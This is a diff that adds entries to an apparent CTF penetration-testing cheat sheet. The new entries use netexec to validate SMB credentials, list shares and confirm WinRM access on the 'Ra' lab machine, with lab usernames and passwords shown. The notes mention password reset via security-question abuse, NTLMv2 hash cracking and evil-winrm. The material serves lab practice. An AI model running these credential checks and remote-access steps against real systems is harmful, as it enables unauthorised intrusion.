@@ -57,3 +57,27 @@ netexec smb 10.130.191.119 -u users.txt -p passwords.txt --continue-on-success
 Used on: **coldvvars**
 
 validated SMB credentials extracted from the web login/XPath path.
+
+### Validate SMB credentials and list shares
+
+```bash
+netexec smb $TARGET -u lilyle -p 'ChangeMe#1234'
+netexec smb $TARGET -u lilyle -p 'ChangeMe#1234' --shares
+```
+
+Used on: **Ra**
+
+Confirmed `lilyle:ChangeMe#1234` after password reset via security-question abuse on
+`fire.windcorp.thm`. Shares output revealed `Spark 2.8.3` installers and the `Users`
+share with active user directories.
+
+### Check WinRM access before connecting
+
+```bash
+netexec winrm $TARGET -u buse -p 'uzunLM+3131'
+```
+
+Used on: **Ra**
+
+Verified WinRM access for `buse` after cracking the NTLMv2 hash. Confirmed
+`[+] windcorp.thm\buse:uzunLM+3131 (Pwn3d!)` before launching `evil-winrm`.
